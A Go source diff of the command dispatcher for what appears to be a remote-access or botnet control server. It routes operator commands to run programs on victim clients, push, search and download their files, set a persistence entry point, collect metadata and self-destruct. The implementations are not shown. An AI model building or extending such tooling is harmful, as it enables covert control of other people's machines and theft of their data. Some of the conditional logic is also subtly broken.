@@ -27,6 +27,8 @@ func handleServer(session *Server, input string, conn net.Conn) {
 		h.ListHelp()
 	case "h":
 		h.ListHelp()
+	case "clear":
+		h.ClearScreen()
 
 	case "count":
 		session.ShowActiveConns()
@@ -37,9 +39,9 @@ func handleServer(session *Server, input string, conn net.Conn) {
 	case "check":
 		if len(parts) > 1 {
 			if parts[1] == "active"{
-				session.CheckActiveClient(conn)
+				session.CheckActiveClient()
 			}else if parts[1] == "group"{
-				session.CheckClientGroup(conn)
+				session.CheckClientGroup()
 			}
 		} else {
 			fmt.Println(h.E, "Unknown command")
@@ -54,7 +56,7 @@ func handleServer(session *Server, input string, conn net.Conn) {
 						fmt.Println(h.E, "Invalid client number")
 						return
 					}
-					session.SelectActiveClient(int64(clientNum), conn)
+					session.SelectActiveClient(int64(clientNum),)
 				} else {
 					fmt.Println(h.E, "Missing client number")
 				}
@@ -65,7 +67,7 @@ func handleServer(session *Server, input string, conn net.Conn) {
 						fmt.Println(h.E, "Invalid group amount")
 						return
 					}
-					session.SetClientGroup(amount, conn)
+					session.SetClientGroup(amount,)
 				} else {
 					fmt.Println(h.E, "Missing group amount")
 				}
@@ -85,10 +87,10 @@ func handleServer(session *Server, input string, conn net.Conn) {
 			return
 		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
 			addr = parts[2]
-			session.ClientPing(addr, parts[1], conn)
+			session.ClientPing(addr, parts[1],)
 		} else if len(parts) == 2 {
 			addr = parts[1]
-			session.ClientPing(addr, "", conn)
+			session.ClientPing(addr, "",)
 		} else {
 			fmt.Println(h.E, "Invalid ping command")
 			return
@@ -101,10 +103,10 @@ func handleServer(session *Server, input string, conn net.Conn) {
 			return
 		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
 			file = parts[2]
-			session.ClientRunApp(file, parts[1], conn)
+			session.ClientRunApp(file, parts[1],)
 		} else if len(parts) == 2 {
 			file = parts[1]
-			session.ClientRunApp(file, "", conn)
+			session.ClientRunApp(file, "",)
 		}
 		
 
@@ -115,10 +117,10 @@ func handleServer(session *Server, input string, conn net.Conn) {
 			return
 		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
 			file = parts[2]
-			session.ServerSendFile(file, parts[1], conn)
+			session.ServerSendFile(file, parts[1],)
 		} else if len(parts) == 2 {
 			file = parts[1]
-			session.ServerSendFile(file, "", conn)
+			session.ServerSendFile(file, "",)
 		}
 		
 
@@ -129,10 +131,10 @@ func handleServer(session *Server, input string, conn net.Conn) {
 			return
 		}else if len(parts) > 2 && parts[1] == "-g" || parts[1] == "-a" {
 			file = parts[2]
-			session.ClientSearchFile(file, parts[1],conn)
+			session.ClientSearchFile(file, parts[1])
 		} else if len(parts) == 2 {
 			file = parts[1]
-			session.ClientSearchFile(file, "", conn)
+			session.ClientSearchFile(file, "",)
 		}
 		
 
@@ -143,43 +145,58 @@ func handleServer(session *Server, input string, conn net.Conn) {
 			return
 		}else if len(parts) > 2 && parts[1] == "-g" ||  parts[1] == "-a" {
 			file = parts[2]
-			session.ClientDownFile(file, parts[1], conn)
+			session.ClientDownFile(file, parts[1],)
 		} else if len(parts) == 2 {
 			file = parts[1]
-			session.ClientDownFile(file, "", conn)
+			session.ClientDownFile(file, "")
 		}
 
 	case "entry":
 		if len(parts) > 1 {
 			if parts[1] == "-g" ||  parts[1] == "-a"{
-				session.ClientEntryPoint(parts[1], conn)
+				session.ClientEntryPoint(parts[1])
 			}else{
 			fmt.Println(h.E, "Invalid entry command")
 			}
 		}else{
-			session.ClientEntryPoint("",conn)
+			session.ClientEntryPoint("")
 		}
 
 	case "blowup":
 		if len(parts) > 1 {
 			if parts[1] == "-g" ||  parts[1] == "-a"{
-				session.ClientSelfDestruct(parts[1], conn)
+				session.ClientSelfDestruct(parts[1],)
 			}else{
 			fmt.Println(h.E, "Invalid entry command")
 			}
 		}else{
-			session.ClientSelfDestruct("",conn)
+			session.ClientSelfDestruct("")
 		}
 
 	case "metadata":
 		if len(parts) > 1 {
 			if parts[1] == "-g" ||  parts[1] == "-a"{
-				session.GetMetaData(parts[1], conn)
+				session.GetMetaData(parts[1])
 			}else{
 			fmt.Println(h.E, "Invalid metadata command")
 			}
 		}else{
-			session.GetMetaData("",conn)
+			session.GetMetaData("")
+		}
+
+	
+	case "echo":
+		session.Echo()
+
+	case "whoami":
+		if len(parts) > 1 {
+			if parts[1] == "-g" ||  parts[1] == "-a"{
+				session.WhoAmI(parts[1])
+			}else{
+			fmt.Println(h.E, "Invalid metadata command")
+			}
+		}else{
+			session.WhoAmI("")
 		}
 
 	case "exit":
